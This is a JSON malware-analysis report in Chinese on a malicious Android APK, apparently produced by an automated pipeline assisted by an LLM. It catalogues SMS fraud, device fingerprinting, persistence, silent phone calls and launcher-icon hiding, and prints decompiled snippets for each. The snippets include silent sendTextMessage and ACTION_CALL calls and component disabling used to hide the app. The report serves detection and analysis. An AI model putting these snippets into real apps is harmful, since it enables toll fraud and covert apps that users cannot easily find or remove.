@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "67827385904f3931a4cf052ef53c5dfa0d08fb1c296b749b693d515566d50caf.apk",
+    "sha256": "67827385904f3931a4cf052ef53c5dfa0d08fb1c296b749b693d515566d50caf",
+    "包名": "com.agreement.bullet",
+    "应用名": "Фото",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 125.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\agreement\\bullet\\e;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Privilege.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该方法接收目标号码(str)、短信内容(str2)和发送状态回调PendingIntent作为参数，通过SmsManager.getDefault().sendTextMessage()在无用户交互的情况下静默发送短信。调用前执行Privilege.a(true)可能用于绕过权限检查或标记静默发送模式。这种静默短信发送行为常用于短信欺诈、恶意订阅扣费或向C2服务器回传用户隐私数据，直接造成用户资费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\agreement\\bullet\\e;",
+          "method_signature": "d(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String d(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static AlarmManager e(Context context) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 读取设备的 android_id 唯一标识符，用于设备指纹采集。在已确认的恶意样本中，此标识符通常会被收集并与其他设备信息一起上传至C2服务器，用于受害者追踪、设备识别或后续的定向攻击。数据流向：Settings.Secure（android_id 数据来源）→ 返回字符串供调用方进一步收集和上传",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\agreement\\bullet\\EnlargeContent;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.agreement.bullet.MUSCLE\", \"Equation\", 1));\nbuilder = new Notification.Builder(getApplicationContext(), \"com.agreement.bullet.MUSCLE\");\nstartForeground(1967, builder.build());\ngetPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), PresentEject.class), 2, 1);",
+          "malicious_code_snippet_context": "      private void a() {\n          Notification.Builder builder;\n          if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.agreement.bullet.MUSCLE\", \"Equation\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.agreement.bullet.MUSCLE\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n          }\n          builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(getString(R.string.b)).setContentText(getString(R.string.a));\n          startForeground(1967, builder.build());",
+          "behavior_description": "该代码通过 startForeground 启动前台服务并创建通知渠道，使恶意服务获得高优先级保活能力，避免被系统杀死。随后调用 setComponentEnabledSetting 禁用 PresentEject 组件（状态值2=COMPONENT_ENABLED_STATE_DISABLED），可能用于隐藏恶意组件入口或图标，降低被用户察觉的风险。在已确认的恶意样本中，此组合用于确保恶意后台行为持久运行。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\agreement\\bullet\\Worm;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Privilege.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "代码使用 ACTION_CALL Intent 直接拨打电话（而非 ACTION_DIAL 调起拨号界面），无需用户确认即可静默拨号。传入的电话号码 str 作为参数来源不明，可能来自远程配置或硬编码的付费号码。结合类名 Worm（蠕虫）和已确认的恶意样本背景，此行为极可能用于拨打付费号码造成用户经济损失或蠕虫传播。FLAG_ACTIVITY_NEW_TASK 确保在非 Activity 上下文中也能启动拨号。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\agreement\\bullet\\EnlargeContent;",
+          "method_signature": "b()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) PresentEject.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      private void b() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) PresentEject.class), 2, 1);\n      }\n  \n      private void c() {",
+          "behavior_description": "该代码通过调用 PackageManager.setComponentEnabledSetting() 将主 Activity 组件（PresentEject.class）设置为 COMPONENT_ENABLED_STATE_DISABLED（值为2），使应用图标从启动器中隐藏。此操作在 startForeground() 创建前台服务之后调用，表明应用在建立持久前台服务后立即隐藏自身图标，使用户难以发现和卸载应用，属于典型的恶意隐匿行为。数据流向：getApplicationContext() 获取上下文 → setComponentEnabledSetting() 禁用主组件实现图标隐藏。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
